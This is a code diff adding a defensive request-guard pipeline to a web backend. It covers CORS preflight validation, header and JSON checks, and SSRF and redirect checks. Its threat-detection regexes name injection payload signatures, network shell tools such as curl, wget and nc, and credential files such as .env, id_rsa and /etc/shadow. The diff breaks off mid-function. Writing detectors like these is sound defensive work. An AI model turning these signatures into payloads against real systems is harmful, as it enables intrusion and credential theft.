+const DIRAC_CENTRAL_PIPELINE_DESCRIPTOR_V221 = 'identity:identity_checked|memory ban:memory_ban_checked|persistent ban:persistent_ban_checked|action format:action_format_checked|alias:alias_checked|whitelist:whitelist_checked|server role:vercel2_action_checked|ENV partition:server1_env_partition_checked|classification:classification_checked|rate limit:rate_checked|server authentication:server_guard_checked|browser authenticity:browser_auth_checked|CSRF:csrf_checked|page nonce:page_nonce_checked|browser signal:browser_signal_checked|device binding:device_checked|admin authentication:admin_checked|public-read policy:public_read_checked|body validation:body_checked|light guard:light_checked|contract validation:contract_checked|A2F signature:a2f_signature_checked|security report:security_report_checked|request sample:sample_checked|threat detection:threat_checked|zero-day protection:zeroday_checked|IDOR/BOLA:idor_checked|circuit breaker:circuit_checked|MFA:mfa_checked|integrity:integrity_checked';
+const DIRAC_CENTRAL_PIPELINE_HASH_V221 = '231d7af073d3090b3002c3a13ec5b9af65356dcff728790656f7bd2900eaa631';
+const DIRAC_CENTRAL_RATE_BUCKETS_V221 = globalThis.__DIRAC_CENTRAL_RATE_BUCKETS_V221__ || new Map();
+const DIRAC_CENTRAL_CONCURRENCY_V221 = globalThis.__DIRAC_CENTRAL_CONCURRENCY_V221__ || new Map();
+globalThis.__DIRAC_CENTRAL_RATE_BUCKETS_V221__ = DIRAC_CENTRAL_RATE_BUCKETS_V221;
+globalThis.__DIRAC_CENTRAL_CONCURRENCY_V221__ = DIRAC_CENTRAL_CONCURRENCY_V221;
+let DIRAC_CENTRAL_SELF_TEST_V221 = Object.freeze({ ok: false, reason: 'not_run' });
+
+const DIRAC_CENTRAL_PREFLIGHT_ALLOWED_HEADERS_V221 = Object.freeze(new Set([
+  'accept',
+  'content-type',
+  'idempotency-key',
+  'x-idempotency-key',
+  'x-csrf-token',
+  'x-dirac-csrf-token',
+  'x-dirac-page-nonce',
+  'x-page-nonce',
+  'x-dirac-public-nonce',
+  'x-dirac-a2f-ticket',
+  'x-dirac-a2f-signature',
+  'x-dirac-a2f-timestamp',
+  'x-dirac-a2f-nonce',
+  'x-requested-with'
+]));
+
+const DIRAC_CENTRAL_PREFLIGHT_GUARD_STAGES_V221 = Object.freeze([
+  'server_authentication',
+  'browser_authenticity',
+  'csrf',
+  'page_nonce',
+  'browser_signal',
+  'device_binding',
+  'admin_authentication',
+  'public_read_policy',
+  'body_validation',
+  'light_guard',
+  'contract_validation',
+  'a2f_signature',
+  'security_report',
+  'request_sample',
+  'threat_detection',
+  'zero_day',
+  'idor_bola',
+  'circuit_breaker',
+  'mfa'
+]);
+
+const DIRAC_CENTRAL_HIGH_CONFIDENCE_THREATS_V221 = Object.freeze([
+  Object.freeze(['sql_injection', /\bunion\s+(?:all\s+)?select\b|(?:^|[\s'"`])(?:or|and)\s+(?:1|true)\s*=\s*(?:1|true)(?:$|[\s'"`])|['"`]\s*(?:or|and)\s+['"`]?\w+['"`]?\s*=\s*['"`]?\w+|;\s*(?:select|insert|update|delete|drop|alter|truncate|create|grant|revoke)\b|\b(?:information_schema|pg_catalog|sqlite_master|mysql\.user|sysobjects|syscolumns)\b|\b(?:sleep|pg_sleep|benchmark)\s*\(|\bwaitfor\s+delay\b|\bload_file\s*\(|\binto\s+outfile\b|\bxp_cmdshell\b|\b(?:extractvalue|updatexml)\s*\(|\bcopy\s+[\s\S]{0,160}\bto\s+program\b/i]),
+  Object.freeze(['xss', /<\s*\/?\s*script\b|\bjavascript\s*:|\bvbscript\s*:|\bon(?:error|load|click|mouseover|focus|blur|submit|toggle|pointerenter|animationstart)\s*=|<\s*(?:svg|iframe|object|embed|meta|link|math)\b|\bsrcdoc\s*=|\bdata\s*:\s*text\/html\b|\bdocument\s*\.\s*cookie\b|\b(?:eval|settimeout|setinterval|function)\s*\(\s*(?:['"`]|unescape|atob)/i]),
+  Object.freeze(['path_traversal_lfi_rfi', /(?:^|[\/\\])\.\.(?:[\/\\]|$)|%2e%2e(?:%2f|%5c)|%252e%252e(?:%252f|%255c)|\/etc\/(?:passwd|shadow)|\/proc\/self\/environ|\bboot\.ini\b|\bwin\.ini\b|\bWEB-INF\b|(?:php|zip|expect):\/\//i]),
+  Object.freeze(['command_injection_rce', /(?:;|\|\||&&|`|\$\()\s*(?:whoami|id|uname|cat|ls|pwd|env|printenv|curl|wget|nc|ncat|netcat|bash|sh|cmd(?:\.exe)?|powershell|pwsh)\b|\b(?:shell_exec|passthru|proc_open|popen|system)\s*\(/i]),
+  Object.freeze(['nosql_injection', /(?:^|[.[{\s\"'])\$(?:ne|gt|gte|lt|lte|where|regex|or|and|nor|expr|jsonschema)(?:\b|])/i]),
+  Object.freeze(['xxe', /<!DOCTYPE[\s\S]{0,800}<!ENTITY|<!ENTITY[\s\S]{0,400}\bSYSTEM\b|\bSYSTEM\s+["'](?:file|http|https):/i]),
+  Object.freeze(['ssti_template_injection', /\{\{\s*7\s*\*\s*7\s*\}\}|\$\{\s*7\s*\*\s*7\s*\}|<%=\s*7\s*\*\s*7\s*%>|#\{\s*7\s*\*\s*7\s*\}|\{\{[\s\S]{0,240}(?:__class__|__mro__|subclasses|config|self)[\s\S]{0,240}\}\}/i]),
+  Object.freeze(['log4shell', /\$\{\s*jndi\s*:\s*(?:ldap|rmi|dns|iiop|corba):/i]),
+  Object.freeze(['crlf_header_injection', /%0d(?:%0a)?|%0a|\\r\\n|(?:^|\n)\s*(?:set-cookie|location|content-length|transfer-encoding)\s*:/i]),
+  Object.freeze(['request_smuggling', /transfer-encoding[\s\S]{0,120}transfer-encoding|content-length[\s\S]{0,120}content-length|content-length[\s\S]{0,120}transfer-encoding|transfer-encoding[\s\S]{0,120}content-length/i]),
+  Object.freeze(['upload_webshell', /\.(?:phtml|phar|jspx?|aspx?)(?:\b|$)|<\?php|\bbase64_decode\s*\(|\b(?:eval|shell_exec|system|passthru)\s*\(/i]),
+  Object.freeze(['secret_file_probing', /(?:^|[\/\\])\.(?:env|git|svn|hg)(?:[\/\\]|$)|\.aws[\/\\]credentials|\bid_rsa\b|\bwp-config\.php\b|(?:^|[\/\\])config\.php\b/i]),
+  Object.freeze(['graphql_introspection', /\b__schema\b|\b__type\b|\bintrospectionquery\b/i]),
+  Object.freeze(['jwt_tampering', /\beyJ[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{10,}\.?[A-Za-z0-9_-]*\b[\s\S]{0,200}\b(?:alg|jku|x5u|kid|none)\b/i])
+]);
+
+function diracCentralIsPreflightV221(ctx) {
+  return Boolean(ctx && String(ctx.method || '').toUpperCase() === 'OPTIONS');
+}
+
+function diracCentralPreflightRequestedHeadersV221(headers) {
+  const raw = String(headers && headers['access-control-request-headers'] || '').trim().toLowerCase();
+  if (!raw) return [];
+  return Array.from(new Set(raw.split(',').map((value) => value.trim()).filter(Boolean)));
+}
+
+function diracCentralValidatePreflightV221(ctx) {
+  if (!diracCentralIsPreflightV221(ctx)) return { ok: true, preflight: false };
+  const headers = ctx && ctx.headers || {};
+  const contract = diracCentralContractForActionV146(ctx.action);
+  const origin = diracCentralNormalizeOriginV146(headers.origin || '');
+  const requestedMethod = String(headers['access-control-request-method'] || '').trim().toUpperCase();
+  const requestedHeaders = diracCentralPreflightRequestedHeadersV221(headers);
+  if (!origin || !DIRAC_CENTRAL_ALLOWED_ORIGINS_V146.has(origin)) return { ok: false, reason: 'preflight_origin_invalid' };
+  if (!contract || !Array.isArray(contract.methods) || !contract.methods.length) return { ok: false, reason: 'preflight_contract_missing' };
+  if (!requestedMethod || requestedMethod === 'OPTIONS' || !contract.methods.includes(requestedMethod)) return { ok: false, reason: 'preflight_requested_method_invalid' };
+  if (requestedHeaders.length > 24 || requestedHeaders.some((name) => !/^[a-z0-9-]{1,64}$/.test(name) || !DIRAC_CENTRAL_PREFLIGHT_ALLOWED_HEADERS_V221.has(name))) {
+    return { ok: false, reason: 'preflight_requested_header_invalid' };
+  }
+  if (String(headers['access-control-request-private-network'] || '').toLowerCase() === 'true') {
+    return { ok: false, reason: 'preflight_private_network_rejected' };
+  }
+  if (Number(headers['content-length'] || 0) !== 0 || String(headers['transfer-encoding'] || '').trim()) {
+    return { ok: false, reason: 'preflight_body_not_empty' };
+  }
+  const secSite = String(headers['sec-fetch-site'] || '').toLowerCase();
+  const secMode = String(headers['sec-fetch-mode'] || '').toLowerCase();
+  if (secSite && !['same-origin', 'same-site'].includes(secSite)) return { ok: false, reason: 'preflight_sec_fetch_site_invalid' };
+  if (secMode && secMode !== 'cors') return { ok: false, reason: 'preflight_sec_fetch_mode_invalid' };
+  return {
+    ok: true,
+    preflight: true,
+    origin,
+    requestedMethod,
+    requestedHeaders: Object.freeze(requestedHeaders.slice())
+  };
+}
+
+
+function diracCentralPreflightContextHashV221(ctx) {
+  const headers = ctx && ctx.headers || {};
+  return crypto.createHash('sha256').update(JSON.stringify({
+    action: String(ctx && ctx.action || ''),
+    origin: String(ctx && ctx.preflightOriginV221 || diracCentralNormalizeOriginV146(headers.origin || '')),
+    requestedMethod: String(ctx && ctx.preflightRequestedMethodV221 || headers['access-control-request-method'] || '').toUpperCase(),
+    requestedHeaders: Array.from(ctx && ctx.preflightRequestedHeadersV221 || diracCentralPreflightRequestedHeadersV221(headers)).sort(),
+    secFetchMode: String(headers['sec-fetch-mode'] || '').toLowerCase()
+  })).digest('hex');
+}
+
+function diracCentralVerifyPreflightCheckpointV221(ctx, stageName) {
+  const stage = String(stageName || '');
+  const stageOffset = DIRAC_CENTRAL_PREFLIGHT_GUARD_STAGES_V221.indexOf(stage);
+  if (stageOffset < 0) return { ok: false, reason: 'preflight_checkpoint_name_invalid' };
+  if (!ctx || ctx.preflightValidatedV221 !== true || ctx.method !== 'OPTIONS') return { ok: false, reason: 'preflight_checkpoint_context_invalid' };
+  if (Number(ctx.currentStageIndexV211) !== stageOffset + 10) return { ok: false, reason: 'preflight_checkpoint_order_invalid_' + stage };
+  const validated = diracCentralValidatePreflightV221(ctx);
+  if (!validated.ok || validated.preflight !== true) return { ok: false, reason: validated.reason || 'preflight_checkpoint_revalidation_failed' };
+  const currentHash = diracCentralPreflightContextHashV221(ctx);
+  if (!ctx.preflightContextHashV221 || !safeEqual(String(ctx.preflightContextHashV221), currentHash)) return { ok: false, reason: 'preflight_context_mutation_detected' };
+  const headers = ctx.headers || {};
+  if (String(headers.authorization || headers.cookie || '').trim()) return { ok: false, reason: 'preflight_credentials_present' };
+  if (String(headers['transfer-encoding'] || '').trim() || Number(headers['content-length'] || 0) !== 0) return { ok: false, reason: 'preflight_body_transport_present' };
+  const requestedHeaders = new Set(ctx.preflightRequestedHeadersV221 || []);
+  if (stage === 'server_authentication') {
+    const internalHeaders = Object.keys(headers).filter((name) => /^x-dirac-(?:server|target-server|s2s|key-version|timestamp|nonce|request-id|body-sha512|signature)/i.test(name));
+    if (internalHeaders.length) return { ok: false, reason: 'preflight_s2s_header_present' };
+  }
+  if ((stage === 'csrf' || stage === 'page_nonce') && ctx.policy && ctx.policy.csrf === true) {
+    if (!requestedHeaders.has('x-csrf-token') && !requestedHeaders.has('x-dirac-csrf-token')) return { ok: false, reason: 'preflight_csrf_header_not_declared' };
+    if (!requestedHeaders.has('x-dirac-page-nonce') && !requestedHeaders.has('x-page-nonce')) return { ok: false, reason: 'preflight_page_nonce_header_not_declared' };
+  }
+  if (stage === 'a2f_signature' && ctx.policy && ctx.policy.a2f === true) {
+    for (const name of ['x-dirac-a2f-ticket', 'x-dirac-a2f-signature', 'x-dirac-a2f-timestamp', 'x-dirac-a2f-nonce']) {
+      if (!requestedHeaders.has(name)) return { ok: false, reason: 'preflight_a2f_header_not_declared_' + name };
+    }
+  }
+  const proofs = ctx.preflightCheckpointProofsV221 && typeof ctx.preflightCheckpointProofsV221 === 'object'
+    ? ctx.preflightCheckpointProofsV221
+    : (ctx.preflightCheckpointProofsV221 = Object.create(null));
+  if (Object.prototype.hasOwnProperty.call(proofs, stage)) return { ok: false, reason: 'preflight_checkpoint_replayed_' + stage };
+  const proof = crypto.createHash('sha256').update([ctx.requestId, ctx.action, stage, currentHash, String(ctx.currentStageIndexV211)].join('|')).digest('hex');
+  proofs[stage] = proof;
+  return { ok: true, proof };
+}
+
+function diracCentralPreflightStageResultV221(ctx, stageName) {
+  const checked = diracCentralVerifyPreflightCheckpointV221(ctx, stageName);
+  return checked.ok
+    ? diracV202StageResult(true, { decision: 'preflight_checkpoint_verified', preflight_proof: checked.proof })
+    : diracV202StageResult(false, { reason: checked.reason });
+}
+
+function diracCentralClassifyFailureV221(reason, stage, directCode) {
+  const value = String(reason || directCode || '').toLowerCase();
+  let failureClass = 'confirmed_security_violation';
+  let severity = 'high';
+  if (/mfa_required|authentication_required|login_required/.test(value)) {
+    failureClass = 'authentication_state';
+    severity = 'info';
+  } else if (/expired/.test(value)) {
+    failureClass = 'expired_security_credential';
+    severity = 'medium';
+  } else if (/rate|circuit|too_fast|surge/.test(value)) {
+    failureClass = 'abuse_rate_control';
+    severity = 'high';
+  } else if (/missing|invalid|not_allowed|not_in_contract|format|field_|body_|method_|origin_|referer_|content_type/.test(value)) {
+    failureClass = 'request_contract_violation';
+    severity = 'high';
+  } else if (/unavailable|storage|required|timeout|exception|error|missing_dependency/.test(value)) {
+    failureClass = 'security_dependency_failure';
+    severity = 'critical';
+  }
+  if (/sql|xss|ssrf|rce|injection|traversal|pollution|smuggling|webshell|tamper|replay|idor|bola|signature/.test(value)) {
+    failureClass = 'confirmed_attack';
+    severity = 'critical';
+  }
+  return Object.freeze({
+    patch: DIRAC_CENTRAL_HARDENING_V221,
+    stage: String(stage || '').slice(0, 80),
+    reason: String(reason || directCode || '').slice(0, 120),
+    failureClass,
+    severity
+  });
+}
+
+function diracCentralDecodeEscapesV228(input) {
+  return String(input || '')
+    .replace(/\\u\{([0-9a-f]{1,6})\}/gi, (_, hex) => {
+      const code = parseInt(hex, 16);
+      return Number.isInteger(code) && code <= 0x10ffff ? String.fromCodePoint(code) : '';
+    })
+    .replace(/\\u([0-9a-f]{4})/gi, (_, hex) => String.fromCharCode(parseInt(hex, 16)))
+    .replace(/\\x([0-9a-f]{2})/gi, (_, hex) => String.fromCharCode(parseInt(hex, 16)))
+    .replace(/\\([0-9a-f]{1,6})(?:\r\n|[\t\n\f\r ])?/gi, (_, hex) => {
+      const code = parseInt(hex, 16);
+      return Number.isInteger(code) && code <= 0x10ffff ? String.fromCodePoint(code) : '';
+    });
+}
+
+function diracCentralCanonicalVariantsV221(value) {
+  const variants = new Set();
+  const queue = [];
+  const add = (input) => {
+    let text = String(input === undefined || input === null ? '' : input).slice(0, 12 * 1024);
+    if (!text || variants.has(text) || variants.size >= 160) return;
+    try { text = text.normalize('NFKC'); } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
+    if (!text || variants.has(text)) return;
+    variants.add(text);
+    queue.push(text);
+  };
+  add(value);
+  for (let index = 0; index < queue.length && index < 160; index += 1) {
+    const text = queue[index];
+    add(text.toLowerCase());
+    add(text.replace(/\+/g, ' '));
+    add(text.replace(/[\u0000\u200b-\u200f\u202a-\u202e\u2060-\u206f\ufeff]/g, ''));
+    add(text.replace(/\\/g, '/'));
+    add(text.replace(/\/\*[\s\S]*?\*\//g, ' '));
+    add(text.replace(/\/\*[\s\S]*?\*\//g, ''));
+    add(text.replace(/[\t\r\n\f ]+/g, ' '));
+    add(diracCentralDecodeEscapesV228(text));
+    add(text.replace(/\$\{(?:(?:lower|upper):|::-) ?([A-Za-z0-9])\}/gi, (_, char) => char));
+    let entity = text;
+    for (let round = 0; round < 4; round += 1) {
+      const decodedEntity = diracCentralHtmlEntityDecodeV146(entity);
+      add(decodedEntity);
+      if (decodedEntity === entity) break;
+      entity = decodedEntity;
+    }
+    let encoded = text;
+    for (let round = 0; round < 6; round += 1) {
+      try {
+        const decoded = decodeURIComponent(encoded);
+        add(decoded);
+        add(decoded.replace(/\+/g, ' '));
+        if (decoded === encoded) break;
+        encoded = decoded;
+      } catch (decodeErrorV228) {
+        void decodeErrorV228;
+        break;
+      }
+    }
+  }
+  return Array.from(variants).map((item) => String(item).slice(0, 12 * 1024));
+}
+
+function diracCentralThreatFieldsV221(req, ctx) {
+  const fields = [];
+  const push = (path, value, source) => {
+    const key = diracCentralNormalizeKeyV146(String(path || '').split('.').pop());
+    const sensitive = diracCentralSensitiveKeyV146(key);
+    const text = String(value === undefined || value === null ? '' : value);
+    fields.push(Object.freeze({
+      path: String(path || '').slice(0, 240),
+      key,
+      source: String(source || '').slice(0, 40),
+      sensitive,
+      value: sensitive ? '[redacted]' : text.slice(0, 12 * 1024)
+    }));
+  };
+  push('request.action', ctx && ctx.action, 'action');
+  push('request.url', diracCentralRedactSensitiveUrlV194(req && req.url), 'url');
+  Object.entries(req && req.query || {}).slice(0, 100).forEach(([key, value]) => {
+    if (Array.isArray(value)) value.slice(0, 20).forEach((item, index) => push('query.' + key + '.' + index, item, 'query'));
+    else push('query.' + key, value, 'query');
+  });
+  diracCentralFlattenObjectV146(ctx && ctx.body || {}, 0, '', 600).forEach((item) => push('body.' + item.key, item.value, 'body'));
+  const headers = req && req.headers || {};
+  [
+    'origin', 'referer', 'referrer', 'host', 'content-type', 'accept',
+    'access-control-request-method', 'access-control-request-headers',
+    'x-forwarded-host', 'x-forwarded-proto', 'transfer-encoding', 'content-length'
+  ].forEach((name) => push('header.' + name, headers[name], 'header'));
+  return fields.slice(0, 800);
+}
+
+function diracCentralUrlLikeFieldV221(field) {
+  return /(?:^|_)(?:url|uri|host|hostname|endpoint|callback|redirect|return|target|webhook|proxy|avatar|image|domain)(?:$|_)/i.test(String(field && field.key || ''))
+    || field && field.source === 'url';
+}
+
+function diracCentralContextualThreatGuardV221(req, ctx) {
+  const fields = diracCentralThreatFieldsV221(req, ctx);
+  for (const field of fields) {
+    const path = String(field.path || '');
+    const key = String(field.key || '');
+    if (/^(?:__proto__|prototype|constructor)$/.test(key) || /(?:^|\.)(?:__proto__|prototype)(?:\.|$)|constructor\.prototype/i.test(path)) {
+      return { detected: true, kind: 'prototype_pollution', field: path };
+    }
+    if (field.sensitive) continue;
+    const variants = diracCentralCanonicalVariantsV221(field.value);
+    for (const candidate of variants) {
+      if (/(?:^|[.\[\]{}\s'"])(?:__proto__|prototype)(?:$|[.\[\]{}\s'"])/i.test(candidate)
+          || /constructor\s*(?:\.|\[)\s*['"]?prototype/i.test(candidate)) {
+        return { detected: true, kind: 'prototype_pollution', field: path };
+      }
+      if (candidate.includes('\u0000') || /[‪-‮⁦-⁩]/.test(candidate)) {
+        return { detected: true, kind: 'unicode_control_or_bidi', field: path };
+      }
+      for (const [kind, pattern] of DIRAC_CENTRAL_HIGH_CONFIDENCE_THREATS_V221) {
+        pattern.lastIndex = 0;
+        if (pattern.test(candidate)) return { detected: true, kind, field: path };
+      }
+      if (diracCentralUrlLikeFieldV221(field)) {
+        let parsed = null;
+        try { parsed = new URL(candidate); } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
+        const host = parsed ? String(parsed.hostname || '').toLowerCase() : String(candidate || '').trim().toLowerCase();
+        if (parsed && !['https:', 'http:'].includes(parsed.protocol)) return { detected: true, kind: 'ssrf_protocol', field: path };
+        if (diracCentralIsUnsafeHostV146(host)
+            || /^(?:0x[0-9a-f]+|0[0-7]+|\d{8,})$/i.test(host)
+            || /(?:^|\/)(?:latest\/meta-data|metadata\/instance|computeMetadata\/v1)(?:\/|$)/i.test(candidate)
+            || /\b(?:metadata\.google\.internal|instance-data)\b/i.test(candidate)) {
+          return { detected: true, kind: 'ssrf_private_or_metadata_target', field: path };
+        }
+      }
+      if (/^(?:redirect|return|next|target|callback|continue|url)$/i.test(key) && /^(?:https?:)?\/\//i.test(candidate)) {
+        try {
+          const redirectUrl = new URL(candidate, 'https://diracgroup.store');
+          if (!DIRAC_CENTRAL_ALLOWED_ORIGINS_V146.has(redirectUrl.origin)) return { detected: true, kind: 'open_redirect', field: path };
+        } catch (_) {
+          return { detected: true, kind: 'open_redirect_invalid_url', field: path };
+        }
+      }
+    }
+  }
+  const mass = diracCentralMassAssignmentThreatV146(ctx);
+  if (mass.detected) return mass;
+  return { detected: false };
+}
+
+function diracCentralJsonDuplicateScanV221(raw) {
+  const text = String(raw || '');
+  let index = 0;
+  let tokens = 0;
+  const maxTokens = 10000;
+  const skip = () => { while (index < text.length && /\s/.test(text[index])) index += 1; };
+  const parseString = () => {
+    const start = index;
+    if (text[index] !== '"') throw new Error('json_string_expected');
+    index += 1;
+    let escaped = false;
+    while (index < text.length) {
+      const char = text[index++];
+      if (escaped) { escaped = false; continue; }
+      if (char === '\\') { escaped = true; continue; }
+      if (char === '"') return JSON.parse(text.slice(start, index));
+      if (char.charCodeAt(0) < 0x20) throw new Error('json_control_character');
+    }
+    throw new Error('json_string_unterminated');
+  };
+  const parsePrimitive = () => {
+    const match = /^(?:true|false|null|-?(?:0|[1-9]\d*)(?:\.\d+)?(?:[eE][+-]?\d+)?)/.exec(text.slice(index));
+    if (!match) throw new Error('json_primitive_invalid');
+    index += match[0].length;
+  };
+  const parseValue = (depth) => {
+    tokens += 1;
+    if (tokens > maxTokens || depth > 12) throw new Error('json_complexity_exceeded');
+    skip();
+    const char = text[index];
+    if (char === '"') { parseString(); return null; }
+    if (char === '{') return parseObject(depth + 1);
+    if (char === '[') return parseArray(depth + 1);
+    parsePrimitive();
+    return null;
+  };
+  const parseObject = (depth) => {
+    index += 1;
+    skip();
+    const keys = new Set();
+    if (text[index] === '}') { index += 1; return null; }
+    while (index < text.length) {
+      skip();
+      const key = parseString();
+      if (keys.has(key)) return { duplicate: true, key: String(key).slice(0, 120) };
+      keys.add(key);
+      skip();
+      if (text[index++] !== ':') throw new Error('json_colon_expected');
+      const nested = parseValue(depth);
+      if (nested && nested.duplicate) return nested;
+      skip();
+      const delimiter = text[index++];
+      if (delimiter === '}') return null;
+      if (delimiter !== ',') throw new Error('json_object_delimiter_invalid');
+    }
+    throw new Error('json_object_unterminated');
+  };
+  const parseArray = (depth) => {
+    index += 1;
+    skip();
+    if (text[index] === ']') { index += 1; return null; }
+    while (index < text.length) {
+      const nested = parseValue(depth);
+      if (nested && nested.duplicate) return nested;
+      skip();
+      const delimiter = text[index++];
+      if (delimiter === ']') return null;
+      if (delimiter !== ',') throw new Error('json_array_delimiter_invalid');
+    }
+    throw new Error('json_array_unterminated');
+  };
+  try {
+    skip();
+    const result = parseValue(0);
+    if (result && result.duplicate) return { ok: false, duplicate: true, key: result.key };
+    skip();
+    if (index !== text.length) return { ok: false, malformed: true, reason: 'json_trailing_data' };
+    return { ok: true };
+  } catch (error) {
+    return { ok: false, malformed: true, reason: String(error && error.message || 'json_invalid').slice(0, 120) };
+  }
+}
+
+function diracCentralPlainJsonStructureV221(value, depth, counters) {
+  if (depth > 8) return { ok: false, reason: 'schema_depth_exceeded' };
+  if (value === null || value === undefined || typeof value !== 'object') return { ok: true };
+  counters.nodes += 1;
+  if (counters.nodes > 1200) return { ok: false, reason: 'schema_node_count_exceeded' };
+  if (Object.getOwnPropertySymbols(value).length) return { ok: false, reason: 'schema_symbol_key_rejected' };
+  if (Array.isArray(value)) {
+    if (value.length > 100) return { ok: false, reason: 'schema_array_length_exceeded' };
+    for (const item of value) {
+      const result = diracCentralPlainJsonStructureV221(item, depth + 1, counters);
+      if (!result.ok) return result;
+    }
+    return { ok: true };
+  }
+  const prototype = Object.getPrototypeOf(value);
+  if (prototype !== Object.prototype && prototype !== null) return { ok: false, reason: 'schema_non_plain_object' };
+  const keys = Object.keys(value);
+  if (keys.length > 160) return { ok: false, reason: 'schema_object_width_exceeded' };
+  for (const key of keys) {
+    if (!/^[A-Za-z0-9_.-]{1,120}$/.test(key)) return { ok: false, reason: 'schema_key_invalid' };
+    if (/^(?:__proto__|prototype|constructor)$/.test(key)) return { ok: false, reason: 'schema_prototype_key_rejected' };
+    const result = diracCentralPlainJsonStructureV221(value[key], depth + 1, counters);
+    if (!result.ok) return result;
+  }
+  return { ok: true };
+}
+
+function diracCentralNormalizeIngressHostV228(value) {
+  const raw = String(value || '').trim().toLowerCase();
+  if (!raw || raw.includes(',') || /[\s\u0000-\u001f\u007f]/.test(raw)) return '';
+  try {
+    const parsed = new URL(raw.includes('://') ? raw : 'https://' + raw);
+    if (parsed.username || parsed.password || parsed.pathname !== '/' || parsed.search || parsed.hash) return '';
+    if (parsed.port && parsed.port !== '443') return '';
+    return parsed.hostname.replace(/\.$/, '');
+  } catch (errorV228) {
+    void errorV228;
+    return '';
+  }
+}
+
+function diracCentralIngressAllowedHostsV228() {
+  const allowed = new Set([
+    'diracgroup.store',
+    'www.diracgroup.store',
+    'companyprofilee-ochre.vercel.app',
+    'companyprofilee-expk.vercel.app'
+  ]);
+  ['DOMAIN_SITE_URL', 'SITE_URL', 'VERCEL_URL'].forEach((name) => {
+    const raw = String(process.env[name] || '').trim();
+    if (!raw) return;
+    const host = diracCentralNormalizeIngressHostV228(raw);
+    if (host) allowed.add(host);
+  });
+  return allowed;
+}
+
+function diracCentralRawHeaderValuesV228(req, expectedName) {
+  const expected = String(expectedName || '').toLowerCase();
+  const values = [];
+  const raw = req && Array.isArray(req.rawHeaders) ? req.rawHeaders : [];
+  if (raw.length % 2 !== 0) return { ok: false, values: [] };
+  for (let index = 0; index < raw.length; index += 2) {
+    if (String(raw[index] || '').toLowerCase() === expected) values.push(String(raw[index + 1] || ''));
+  }
+  if (!values.length && req && req.headers && req.headers[expected] !== undefined) {
+    const value = req.headers[expected];
+    if (Array.isArray(value)) values.push(...value.map(String));
+    else values.push(String(value));
+  }
+  return { ok: true, values };
+}
+
+function diracCentralRawRequestHeaderGuardV228(req, ctx) {
+  const allowedHosts = diracCentralIngressAllowedHostsV228();
+  const criticalNames = [
+    'host', ':authority', 'x-forwarded-host', 'x-forwarded-proto',
+    'content-length', 'transfer-encoding', 'connection', 'upgrade', 'expect'
+  ];
+  const critical = Object.fromEntries(criticalNames.map((name) => [name, diracCentralRawHeaderValuesV228(req, name)]));
+  if (!Object.values(critical).every((entry) => entry.ok)) return { ok: false, reason: 'raw_header_array_malformed' };
+  for (const name of criticalNames) {
+    if (critical[name].values.length > 1) return { ok: false, reason: 'duplicate_critical_header_' + name.replace(/[^a-z0-9]+/g, '_') };
+  }
+  const transferEncoding = String(critical['transfer-encoding'].values[0] || '').trim();
+  const contentLength = String(critical['content-length'].values[0] || '').trim();
+  const connection = String(critical.connection.values[0] || '').trim().toLowerCase();
+  const upgrade = String(critical.upgrade.values[0] || '').trim();
+  const expect = String(critical.expect.values[0] || '').trim();
+  if (transferEncoding) return { ok: false, reason: 'transfer_encoding_rejected' };
+  if (transferEncoding && contentLength) return { ok: false, reason: 'content_length_transfer_encoding_conflict' };
+  if (upgrade) return { ok: false, reason: 'protocol_upgrade_rejected' };
+  if (expect) return { ok: false, reason: 'expect_header_rejected' };
+  if (/(?:^|,)\s*(?:upgrade|transfer-encoding|trailer)\s*(?:,|$)/i.test(connection)) return { ok: false, reason: 'connection_hop_by_hop_token_rejected' };
+  if (contentLength && (!/^(?:0|[1-9]\d{0,15})$/.test(contentLength) || !Number.isSafeInteger(Number(contentLength)))) {
+    return { ok: false, reason: 'content_length_invalid' };
+  }
+  const host = diracCentralNormalizeIngressHostV228(critical.host.values[0] || '');
+  const authority = diracCentralNormalizeIngressHostV228(critical[':authority'].values[0] || '');
+  const forwardedHost = diracCentralNormalizeIngressHostV228(critical['x-forwarded-host'].values[0] || '');
+  const forwardedProto = String(critical['x-forwarded-proto'].values[0] || '').trim().toLowerCase();
+  if (diracCentralIsProductionV146() && !host && !authority) return { ok: false, reason: 'host_header_missing' };
+  for (const candidate of [host, authority, forwardedHost].filter(Boolean)) {
+    if (!allowedHosts.has(candidate)) return { ok: false, reason: 'host_header_not_allowlisted' };
+  }
+  if (host && authority && host !== authority) return { ok: false, reason: 'host_authority_mismatch' };
+  if (forwardedHost && host && forwardedHost !== host) return { ok: false, reason: 'host_forwarded_host_mismatch' };
+  if (forwardedHost && authority && forwardedHost !== authority) return { ok: false, reason: 'authority_forwarded_host_mismatch' };
+  if (diracCentralIsProductionV146() && forwardedProto !== 'https') return { ok: false, reason: 'forwarded_proto_not_https' };
+  const rawUrl = String(req && req.url || '');
+  if (/[^\x20-\x7e]/.test(rawUrl) || rawUrl.includes('\\') || /%(?:0d|0a|00)/i.test(rawUrl)) return { ok: false, reason: 'raw_url_invalid' };
+  const queryIndex = rawUrl.indexOf('?');
+  if (queryIndex >= 0) {
+    const rawQuery = rawUrl.slice(queryIndex + 1);
+    const params = new URLSearchParams(rawQuery);
+    for (const key of new Set(params.keys())) {
+      if (params.getAll(key).length > 1) return { ok: false, reason: 'duplicate_raw_query_parameter_' + String(key).slice(0, 80) };
+    }
+  }
+  return { ok: true };
+}
+
+async function diracCentralCaptureRawRequestV230(req) {
+  if (!req || typeof req !== 'object') return { ok: false, reason: 'raw_request_object_required' };
+  try {
+    const candidates = [req.__diracRawBodyBufferV230, req.__diracRawJsonV221, req.rawBody, req.bodyRaw, req.raw];
+    let buffer = null;
+    for (const value of candidates) {
+      if (Buffer.isBuffer(value) || value instanceof Uint8Array) { buffer = Buffer.from(value); break; }
+      if (typeof value === 'string') { buffer = Buffer.from(value, 'utf8'); break; }
+    }
+    const bodyDescriptorV230 =
+      Object.getOwnPropertyDescriptor(req, 'body');
+    const bodyHasDataValueV230 = Boolean(
+      bodyDescriptorV230 &&
+      Object.prototype.hasOwnProperty.call(bodyDescriptorV230, 'value')
+    );
+    const bodyValueV230 = bodyHasDataValueV230
+      ? bodyDescriptorV230.value
+      : undefined;
+    const bodyValuePresentV230 =
+      bodyValueV230 !== undefined && bodyValueV230 !== null;
+
+    if (
+      !buffer &&
